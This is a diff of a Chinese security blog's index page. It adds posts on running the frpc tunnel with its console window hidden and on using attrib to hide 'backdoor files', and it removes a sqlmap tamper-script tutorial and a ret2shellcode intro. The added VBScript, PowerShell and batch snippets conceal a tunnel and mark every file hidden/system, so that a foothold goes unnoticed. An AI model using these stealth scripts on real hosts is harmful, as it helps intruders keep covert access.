@@ -75,6 +75,204 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-tools-CMD-hidden-cmdline" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/25/tools-CMD-hidden-cmdline/" class="article-date">
+  <time class="dt-published" datetime="2024-03-25T06:52:31.000Z" itemprop="datePublished">2024-03-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="隐藏命令行黑框"><a href="#隐藏命令行黑框" class="headerlink" title="隐藏命令行黑框"></a>隐藏命令行黑框</h1><p>​	在windows环境下frp运行时，总会弹出一个黑框框，很容易被人识别，在不改动源码或者重新编译的情况下，可以通过下面的方法让黑框隐藏</p>
+<h2 id="1-基于-Wscript-Shell-的隐藏命令行黑框方法"><a href="#1-基于-Wscript-Shell-的隐藏命令行黑框方法" class="headerlink" title="1. 基于 Wscript.Shell 的隐藏命令行黑框方法"></a>1. 基于 Wscript.Shell 的隐藏命令行黑框方法</h2><h3 id="1-1-使用-vbscript-脚本"><a href="#1-1-使用-vbscript-脚本" class="headerlink" title="1.1 使用 vbscript 脚本"></a>1.1 使用 vbscript 脚本</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> objShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">objShell.Run <span class="string">&quot;cmd.exe /C frpc.exe -c frpc.ini&quot;</span>, <span class="number">0</span>, <span class="literal">False</span></span><br><span class="line">objShell.Run <span class="string">&quot;cmd.exe /C attrib +s +h +r /s /d *&quot;</span>, <span class="number">0</span>, <span class="literal">False</span></span><br><span class="line">WScript.Quit</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20240325141016145.png" alt="image-20240325141016145"></p>
+<h3 id="1-2-使用-powershell-脚本"><a href="#1-2-使用-powershell-脚本" class="headerlink" title="1.2 使用 powershell 脚本"></a>1.2 使用 powershell 脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$shell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$shell</span>.Run(<span class="string">&quot;frpc.exe -c frpc.ini&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable">$shell</span>.Run(<span class="string">&quot;attrib +s +h +r /s /d *&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">Exit</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20240325142222704.png" alt="image-20240325142222704"></p>
+<h3 id="1-3-使用批处理脚本"><a href="#1-3-使用批处理脚本" class="headerlink" title="1.3 使用批处理脚本"></a>1.3 使用批处理脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit</span><br><span class="line"></span><br><span class="line">:begin</span><br><span class="line">attrib +s +h +r /d /s *</span><br><span class="line">REM</span><br><span class="line">.\frpc.exe -c .\frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-基于-Start-Process-的隐藏命令行黑框方法"><a href="#2-基于-Start-Process-的隐藏命令行黑框方法" class="headerlink" title="2. 基于 Start-Process 的隐藏命令行黑框方法"></a>2. 基于 Start-Process 的隐藏命令行黑框方法</h2><h3 id="2-1-使用-powershell-脚本"><a href="#2-1-使用-powershell-脚本" class="headerlink" title="2.1 使用 powershell 脚本"></a>2.1 使用 powershell 脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">programPath = <span class="string">&quot;frpc.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$programArgs</span> = <span class="string">&quot;-c frpc.ini&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$processArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    FilePath = <span class="variable">$programPath</span></span><br><span class="line">    ArgumentList = <span class="variable">$programArgs</span></span><br><span class="line">    WindowStyle = <span class="string">&#x27;Hidden&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Start-Process</span> @processArgs</span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenProgram</span> = <span class="string">&quot;attrib.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenArgs</span> = <span class="string">&quot;+s +r +h *&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenprocessArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    FilePath = <span class="variable">$hiddenProgram</span></span><br><span class="line">    ArgumentList = <span class="variable">$hiddenArgs</span></span><br><span class="line">    WindowStyle = <span class="string">&#x27;Hidden&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Start-Process</span> @hiddenprocessArgs</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20240325143352718.png" alt="image-20240325143352718"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/25/tools-CMD-hidden-cmdline/" data-id="clu6lf1gv0009a2vdhtpthmjh" data-title="tools-CMD-hidden-cmdline" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-tools-CMD-attrib" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/25/tools-CMD-attrib/" class="article-date">
+  <time class="dt-published" datetime="2024-03-25T06:51:42.000Z" itemprop="datePublished">2024-03-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/25/tools-CMD-attrib/">tools-CMD-attrib</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="批处理命令attrib"><a href="#批处理命令attrib" class="headerlink" title="批处理命令attrib"></a>批处理命令attrib</h1><h2 id="0-概念"><a href="#0-概念" class="headerlink" title="0. 概念"></a>0. 概念</h2><p>​	attrib是attribute的缩写，显示或更改文件（夹）属性的意思，是一个外部命令</p>
+<h2 id="1-帮助文档"><a href="#1-帮助文档" class="headerlink" title="1. 帮助文档"></a>1. 帮助文档</h2><blockquote>
+<p>ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]<br>[drive:][path][filename] [&#x2F;S [&#x2F;D]] [&#x2F;L]</p>
+</blockquote>
+<h3 id="1-1-属性修改"><a href="#1-1-属性修改" class="headerlink" title="1.1 属性修改"></a>1.1 属性修改</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>+</td>
+<td>设置属性</td>
+</tr>
+<tr>
+<td>-</td>
+<td>清楚属性</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-属性类别"><a href="#1-2-属性类别" class="headerlink" title="1.2 属性类别"></a>1.2 属性类别</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>R</td>
+<td>只读文档属性</td>
+</tr>
+<tr>
+<td>A</td>
+<td>存档文档属性</td>
+</tr>
+<tr>
+<td>S</td>
+<td>系统文件属性</td>
+</tr>
+<tr>
+<td>H</td>
+<td>隐藏文件属性</td>
+</tr>
+<tr>
+<td>O</td>
+<td>脱机属性</td>
+</tr>
+<tr>
+<td>I</td>
+<td>无内容索引文件属性</td>
+</tr>
+<tr>
+<td>X</td>
+<td>无清理文件属性</td>
+</tr>
+<tr>
+<td>V</td>
+<td>完整性属性</td>
+</tr>
+<tr>
+<td>P</td>
+<td>固定属性</td>
+</tr>
+<tr>
+<td>U</td>
+<td>非固定属性</td>
+</tr>
+</tbody></table>
+<h4 id="1-2-1-存档属性"><a href="#1-2-1-存档属性" class="headerlink" title="1.2.1 存档属性"></a>1.2.1 存档属性</h4><p>​	“存档”属性是用于指示文件是否已被修改或需要进行备份的标志。当文件被修改后，”存档”属性会自动设置为”已修改”状态，表示文件需要进行备份。备份工具通常会根据文件的”存档”属性来确定哪些文件需要备份。</p>
+<h4 id="1-2-2-系统属性"><a href="#1-2-2-系统属性" class="headerlink" title="1.2.2 系统属性"></a>1.2.2 系统属性</h4><p>​	“系统”属性用于标识文件为操作系统的核心文件或系统文件。设置了”系统”属性的文件通常具有特殊的权限和保护级别，防止用户对其进行意外或恶意的更改或删除。</p>
+<h4 id="1-2-3-脱机属性"><a href="#1-2-3-脱机属性" class="headerlink" title="1.2.3 脱机属性"></a>1.2.3 脱机属性</h4><p>​	“脱机”属性用于指示文件是否处于脱机状态，即文件不需要与远程服务器保持同步。文件的”脱机”属性通常与网络文件共享和同步功能一起使用。当文件被标记为”脱机”属性时，表示该文件是网络文件，并且可以在离线状态下访问。这意味着文件可以从远程服务器下载到本地计算机，并在没有网络连接的情况下进行访问和修改。当重新连接到网络时，更改的文件可以与远程服务器同步。</p>
+<h4 id="1-2-4-无内容索引文件属性"><a href="#1-2-4-无内容索引文件属性" class="headerlink" title="1.2.4 无内容索引文件属性"></a>1.2.4 无内容索引文件属性</h4><p>​	“无内容索引”（Sparse）文件属性是一种用于指示文件使用了稀疏文件分配技术的属性。稀疏文件是一种优化技术，用于在文件系统中节省存储空间，特别适用于处理大型文件中的稀疏数据。当文件被标记为”无内容索引”属性时，文件系统会将文件中的连续空白数据块标记为稀疏块，而不会实际分配磁盘空间来存储这些空白数据块。这样可以有效地减少文件的物理大小，节省存储空间。</p>
+<h4 id="1-2-5-无清理文件属性"><a href="#1-2-5-无清理文件属性" class="headerlink" title="1.2.5 无清理文件属性"></a>1.2.5 无清理文件属性</h4><p>​	“无清理文件”属性用于指示文件不应该在进行磁盘清理或优化操作时被清理或处理。通常，磁盘清理工具会扫描磁盘上的文件，并根据一些规则来删除或优化不再需要的文件。但是，如果文件具有”无清理文件”属性，清理工具会跳过对该文件的处理，保留文件不受影响。</p>
+<h4 id="1-2-6-完整性属性"><a href="#1-2-6-完整性属性" class="headerlink" title="1.2.6 完整性属性"></a>1.2.6 完整性属性</h4><p>​	文件完整性是一种安全功能，用于确保文件在存储和传输过程中的完整性。通过启用文件完整性功能，可以在文件或目录上设置一个完整性级别，以保护其内容不被未经授权的修改、篡改或破坏。</p>
+<h3 id="1-3-其他"><a href="#1-3-其他" class="headerlink" title="1.3 其他"></a>1.3 其他</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;S</td>
+<td>处理当前文件夹及其所有子文件夹中的匹配文件</td>
+</tr>
+<tr>
+<td>&#x2F;D</td>
+<td>以同样的方式处理文件夹</td>
+</tr>
+<tr>
+<td>&#x2F;L</td>
+<td>处理符号链接和符号链接目标的属性</td>
+</tr>
+</tbody></table>
+<h2 id="2-隐藏后门文件"><a href="#2-隐藏后门文件" class="headerlink" title="2. 隐藏后门文件"></a>2. 隐藏后门文件</h2><blockquote>
+<p>attrib +s +h +r &#x2F;d &#x2F;s *</p>
+</blockquote>
+<p>​	处理当前文件夹及所有子文件夹中文件和文件夹，使得其只读、隐藏、以系统权限运行</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/25/tools-CMD-attrib/" data-id="clu6lf1gu0007a2vd2yj59xjb" data-title="tools-CMD-attrib" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web-XSS-FlashXss-xss-PDF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/25/web-XSS-FlashXss-xss-PDF/" class="article-date">
@@ -146,7 +344,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/25/web-XSS-FlashXss-xss-PDF/" data-id="clu6gi7kh000qkyvdf2qmaty4" data-title="web-XSS-FlashXss-xss-PDF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/25/web-XSS-FlashXss-xss-PDF/" data-id="clu6lf1hm000ua2vdht5m9arl" data-title="web-XSS-FlashXss-xss-PDF" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -242,7 +440,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs20/" data-id="clu6gi7kj000ukyvd3obs0ztf" data-title="web-XSS-FlashXss-xss-labs20" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs20/" data-id="clu6lf1ho000za2vd2fz44wwj" data-title="web-XSS-FlashXss-xss-labs20" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -361,7 +559,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu6gi7ki000rkyvdf2sn8c3w" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu6lf1hn000wa2vd1y3s2wvn" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -407,7 +605,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu6gi7k40007kyvdhzya1waf" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu6lf1gw000aa2vd63eh0l1c" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -513,7 +711,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu6gi7ju0001kyvdd4uxghda" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu6lf1gd0001a2vd5xzg6mc9" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -583,7 +781,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu6gi7kf000nkyvd0fsibzba" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu6lf1hi000qa2vdgfkk0z1v" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -727,7 +925,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu6gi7kg000pkyvd290y144m" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu6lf1hj000ra2vd68wchrnl" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -779,165 +977,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu6gi7kd000lkyvd734x1h1z" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu6lf1hh000pa2vdhpblaj53" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-tools-sqlmap-script-build" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/21/tools-sqlmap-script-build/" class="article-date">
-  <time class="dt-published" datetime="2024-03-20T16:49:32.000Z" itemprop="datePublished">2024-03-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/21/tools-sqlmap-script-build/">tools-sqlmap-script-build</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SQLMAP-tamper-的编写"><a href="#SQLMAP-tamper-的编写" class="headerlink" title="SQLMAP tamper 的编写"></a>SQLMAP tamper 的编写</h1><h2 id="0-关于-sqlmap-的-tamper"><a href="#0-关于-sqlmap-的-tamper" class="headerlink" title="0. 关于 sqlmap 的 tamper"></a>0. 关于 sqlmap 的 tamper</h2><p>​	在sqlmap的目录下，可以看到一个名字为tamper的文件，这个文件中，存放着sqlmap自带的脚本，我们也可以在其中创建自己的脚本，然后去针对不同的网站进行不同的绕过策略。我们通过对脚本的编写，可以修改sqlmap在攻击时所使用的payload或修改Header的值来进行更有针对性的攻击。</p>
-<h2 id="1-标准-tamper-脚本结构"><a href="#1-标准-tamper-脚本结构" class="headerlink" title="1. 标准 tamper 脚本结构"></a>1. 标准 tamper 脚本结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"># 当前脚本调用优先等级</span><br><span class="line">__priority__ = PRIORITY.LOW </span><br><span class="line"></span><br><span class="line"># 声明当前脚本适用/不适用的范围，可以为空。</span><br><span class="line">def dependencies(): </span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line"># 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">def tamper(payload, **kwargs): </span><br><span class="line">  return payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-1-重要部分解析"><a href="#1-1-重要部分解析" class="headerlink" title="1.1 重要部分解析"></a>1.1 重要部分解析</h3><h4 id="1-1-1-priority-Param"><a href="#1-1-1-priority-Param" class="headerlink" title="1.1.1 priority [Param]"></a>1.1.1 priority [Param]</h4><p>​	priority定义脚本的优先级，用于在测试过程中选用多个tamper脚本的情况下测试的先后顺序。谁的优先级高，谁被优先使用。（优先级共有七个，分别为；LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）</p>
-<h4 id="1-1-2-dependencies-Fuction"><a href="#1-1-2-dependencies-Fuction" class="headerlink" title="1.1.2 dependencies [Fuction]"></a>1.1.2 dependencies [Fuction]</h4><p>​	dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
-<h4 id="1-1-3-tamper-Fuction"><a href="#1-1-3-tamper-Fuction" class="headerlink" title="1.1.3 tamper [Fuction]"></a>1.1.3 tamper [Fuction]</h4><p>​	tamper是主要的函数，接受的参数为payload和**kwargs，返回值为替换后的payload。</p>
-<p>​	payload 拼接查询语句</p>
-<p>​	**kwargs 存储的是 HTTP REQUEST 请求头中的内容， 多数存储在 kwargs[‘headers’] 中</p>
-<h2 id="2-编写测试脚本并验证"><a href="#2-编写测试脚本并验证" class="headerlink" title="2. 编写测试脚本并验证"></a>2. 编写测试脚本并验证</h2><h3 id="2-1-开启HTTP服务"><a href="#2-1-开启HTTP服务" class="headerlink" title="2.1 开启HTTP服务"></a>2.1 开启HTTP服务</h3><p>​	在虚拟机中开启 HTTP 服务，模拟存在SQL注入的web服务</p>
-<p><img src="/images/image-20240321003450311.png" alt="image-20240321003450311"></p>
-<h3 id="2-2-编写测试脚本"><a href="#2-2-编写测试脚本" class="headerlink" title="2.2 编写测试脚本"></a>2.2 编写测试脚本</h3><p>​	我们尝试在每次发送的请求URL最后都加上fregment，其内容为”#just-for-test”，并设置请求头headers中”X-Forwarded-For”字段的数值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># self2test.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>].setdefault(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>][<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;#just-for-test&quot;</span>.<span class="built_in">format</span>(payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3-BurpSuite-抓包监听"><a href="#2-3-BurpSuite-抓包监听" class="headerlink" title="2.3 BurpSuite 抓包监听"></a>2.3 BurpSuite 抓包监听</h3><p>​	设置 Bp 监听本地8080端口</p>
-<h3 id="2-4-运行脚本"><a href="#2-4-运行脚本" class="headerlink" title="2.4 运行脚本"></a>2.4 运行脚本</h3><blockquote>
-<p>python sqlmap.py –proxy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –tamper&#x3D;self2test -u “<a target="_blank" rel="noopener" href="http://192.168.70.196:8000/?id=1">http://192.168.70.196:8000/?id=1</a>*”</p>
-</blockquote>
-<p>​	使用--proxy参数指定代理地址为<a href="http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察">http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察</a></p>
-<p><img src="/images/image-20240321004123079.png" alt="image-20240321004123079"></p>
-<p>​	在流量包的数据中我们可以很清楚的看见URL中多出了个内容为”#just-for-test”的fregment，并且在请求头headers中”X-Forwarded-For”字段的数值也被设置了</p>
-<p><img src="/images/image-20240321004443797.png" alt="image-20240321004443797"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu6gi7k8000ckyvd471rbfwe" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-pwn-stackoverflow-ret2shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/" class="article-date">
-  <time class="dt-published" datetime="2024-03-20T12:58:10.000Z" itemprop="datePublished">2024-03-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/20/pwn-stackoverflow-ret2shellcode/">pwn-stackoverflow-ret2shellcode</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2shellcode原理"><a href="#0-1-ret2shellcode原理" class="headerlink" title="0.1 ret2shellcode原理"></a>0.1 ret2shellcode原理</h3><p>​	ret2shellcode控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
-<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
-<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
